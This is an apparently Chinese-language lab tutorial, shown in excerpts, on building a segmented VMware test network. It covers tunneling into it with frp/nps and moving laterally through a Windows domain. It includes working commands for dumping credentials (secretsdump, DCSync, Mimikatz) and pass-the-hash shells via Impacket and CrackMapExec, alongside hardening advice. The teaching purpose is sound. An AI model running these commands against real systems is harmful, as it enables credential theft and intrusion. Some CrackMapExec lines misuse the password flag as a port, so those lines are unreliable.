...
| 技能 | 能够在 VMware 中搭建多网段隔离实验环境；能够使用 Windows netsh/RRAS 配置 NAT 转发与端口映射；能够部署和配置 frp/nps 实现内网穿透；能够使用 Nmap 通过内网穿透隧道扫描内部网络；能够使用 Impacket/CrackMapExec 工具进行横向移动；能够实施内网安全加固措施（SMB签名、Protected Users、防火墙规则等） |
...
| 重点 | 内网横向移动技术 | 理解 Pass-the-Hash 的原理，掌握 Impacket 工具族（psexec/wmiexec/secretsdump）的使用 |
...
| 虚拟机 | 角色 | 操作系统 | 内存 | 硬盘 |
| --- | --- | --- | --- | --- |
| **Kali Linux** | 攻击机（模拟公网） | Kali Linux 2024+ | 4 GB | 40 GB |
| **SRV01** | 双网卡网关/DMZ服务器 | Windows Server 2022 | 4 GB | 60 GB |
| **SRV02** | 内网服务器/域控 | Windows Server 2022 | 4 GB | 60 GB |
...
SRV01 重启后，配置 NAT 使内网主机可以通过 SRV01 访问外网：

```powershell
# 以管理员身份运行 PowerShell

# 方法一：使用 netsh 配置 NAT（简单快速）
# 添加 NAT 转换规则（在"公网"接口上启用 NAT）
netsh routing ip nat install
netsh routing ip nat add interface "以太网"     # NAT网卡（连接VMnet8）
netsh routing ip nat add interface "以太网 2" full   # Host-Only网卡（连接VMnet1）

# "full" 表示该接口连接的是私有网络，需要地址转换
```

> 💡 **netsh routing** 命令在 Windows Server 2022 中仍可用，但微软推荐使用 RRAS 图形界面。如果 `netsh routing` 报错，请使用方法二（RRAS）。
...
```powershell
# 在 SRV02 上启动 npc
C:\npc\npc.exe -server=192.168.10.10:8024 -vkey=npstest2024
...
| 工具 | 协议 | 所需权限 | 特点 |
| --- | --- | --- | --- |
| **psexec.py** | SMB(445) | 管理员凭据 | 通过SMB上传服务并执行，返回SYSTEM权限Shell |
| **wmiexec.py** | WMI(135) | 管理员凭据 | 通过WMI远程执行命令，无文件落地 |
| **smbexec.py** | SMB(445) | 管理员凭据 | 通过SMB服务执行命令，不留日志 |
| **evil-winrm** | WinRM(5985) | 管理员凭据 | 基于WinRM的交互式Shell，支持文件传输 |
| **CrackMapExec** | SMB/LDAP/WinRM | 凭据 | 批量操作，支持多种协议和攻击 |
| **atexec.py** | SMB+TaskSched | 管理员凭据 | 通过计划任务远程执行命令 |
...
```bash
# 在 Kali 上安装 Impacket（通常已预装）
pip3 install impacket
# 或从源码安装
cd /opt && git clone https://github.com/fortra/impacket.git
...
```bash
# 在 Kali 上使用 Impacket secretsdump 通过 frp WinRM/SMB 映射获取哈希
# 方法一：通过 SMB 映射端口（10004）
python3 /opt/impacket/examples/secretsdump.py administrator:'P@ssw0rd'@192.168.10.10 -port 10004

# 如果 frp 映射的是 445 端口，使用 -port 参数指定
# 预期输出（部分）：
...
> 💡 **如果 secretsdump 无法直接通过映射端口连接**（某些 Impacket 脚本不支持自定义端口），可使用 CrackMapExec 替代，或通过 Evil-WinRM 的 `Invoke-Mimikatz` 在目标上直接执行。
...
# 方法一：CrackMapExec（批量操作）
# 使用 PtH 验证哈希有效性
crackmapexec smb 192.168.10.10 -p 10004 -u administrator -H '<NTLM_HASH>' --port 10004

# 方法二：使用 PtH 执行远程命令
crackmapexec smb 192.168.10.10 -u administrator -H '<NTLM_HASH>' -x "whoami"

# 方法三：Impacket wmiexec（交互式Shell）
python3 /opt/impacket/examples/wmiexec.py -hashes :'<NTLM_HASH>' administrator@192.168.10.10

# 方法四：Impacket psexec（SYSTEM权限Shell）
python3 /opt/impacket/examples/psexec.py -hashes :'<NTLM_HASH>' administrator@192.168.10.10
```
...
crackmapexec smb 192.168.10.10 -u administrator -H '<NTLM_HASH>' -p 10004
...
| 获取NTLM哈希 | Evil-WinRM + `Invoke-Mimikatz` / Impacket `secretsdump.py` |
| Pass-the-Hash | `psexec.py -hashes :NTLM 用户@IP` / `wmiexec.py -hashes :NTLM 用户@IP` |
| DCSync导出域哈希 | `secretsdump.py 域/用户:密码@域控IP -just-dc-ntlm` |
...
| Impacket 脚本报端口错误 | Impacket 脚本不支持自定义端口 | 使用 CrackMapExec 的 `--port` 参数替代 |
